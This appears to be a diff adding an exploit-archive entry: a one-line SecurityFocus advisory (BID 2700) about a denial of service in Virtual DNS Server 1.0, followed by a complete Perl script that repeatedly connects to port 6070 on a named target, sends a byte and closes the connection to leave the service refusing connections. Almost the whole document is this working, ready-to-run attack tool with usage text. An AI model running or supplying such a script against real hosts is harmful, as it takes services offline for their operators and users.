@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/2700/info
+
+It is possible for a remote user to cause a denial of service on a host running DSL_Vdns. Submitting data to port 6070 and closing the connection before the request is fulfilled, will cause DSL_Vdns to enter a 'Default.Closed' state; therefore, refusing any new connections. 
+
+#!/usr/bin/perl
+#
+# VDNS.PL - Crashes Virtual DNS Server 1.0
+# Written by nemesystm of the DHC
+# http://dhcorp.cjb.net - neme-dhc@hushmail.com
+#
+####
+use Socket;
+
+die "$0 - Stops Virtual DNS Server 1.0.
+written by nemesystm of the DHC
+http://dhcorp.cjb.net - neme-dhc\@hushmail.com
+usage: perl $0 target.com\n" if !defined $ARGV[0];
+
+for ($count = 0; $count <= 3; $count++) {
+        $serverIP = inet_aton($ARGV[0]);
+        $serverAddr = sockaddr_in(6070, $serverIP);
+        socket(CLIENT, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
+        if (connect (CLIENT, $serverAddr)) {
+                send (CLIENT, "A", 0);
+                close (CLIENT);
+        } else { print ("if the number shown is 2, it worked"); die "Can't connect: $count\n"; }
+}
